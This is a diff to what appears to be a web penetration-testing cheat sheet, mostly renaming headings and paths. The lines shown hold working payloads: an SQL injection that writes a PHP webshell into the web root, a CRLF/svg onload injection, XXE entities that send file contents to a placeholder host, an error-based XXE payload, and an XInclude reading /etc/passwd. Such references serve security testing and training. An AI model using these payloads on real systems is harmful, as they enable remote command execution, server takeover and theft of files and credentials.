@@ -551,11 +551,11 @@ https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS
   
 ### Webshell via SQLI
   
-' union select 1, 2, 3,"<\?php system($_GET['cmd']);\?>" into outfile "/var/www/html/pdp.php"-- -
+' union select 1, 2, 3,"<\?php system($_GET['cmd']);\?>" into outfile "/var/www/html/shell.php"-- -
   
 ### SQL Injection Second-Order (query connector)
 
-codes/sqli_second_order/sqlitwo.php
+codes/sqli/second_order/script.php
 
 ### SQL Injection Out-Of-Band, etc
 
@@ -719,9 +719,9 @@ https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploi
 
 /%0d%0a%0d%0a\<svg onload=(0)>
 
-## XXE OOB
+## XXE Blind Out-Of-Band
   
-### XXE OOB - Exfiltrate data exfiltrating data via dtd
+### Exfiltrate data exfiltrating data via dtd
 
 -> Part 1
 
@@ -749,7 +749,7 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
   
 \<!ENTITY % int "\<!ENTITY exfil SYSTEM 'http://ip/?leak=%file;'>">
   
-### XXE OOB to retrieve data via error messages with dtd file
+### Retrieve data via error messages with dtd file
   
 codes/xxe/error.dtd
   
@@ -775,11 +775,11 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 
 \<!ENTITY % payload "\<!ENTITY &#37; remote SYSTEM 'file:///idonotexist/%file;'>">
   
-### XXE OOB - XInclude to retrieve files with dtd file
+### XInclude to retrieve files with dtd file
 
 \<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/>\</foo>
 
-### XXE OOB - Image file upload
+### Image file upload
 
 code/xxe/evil.svg
 
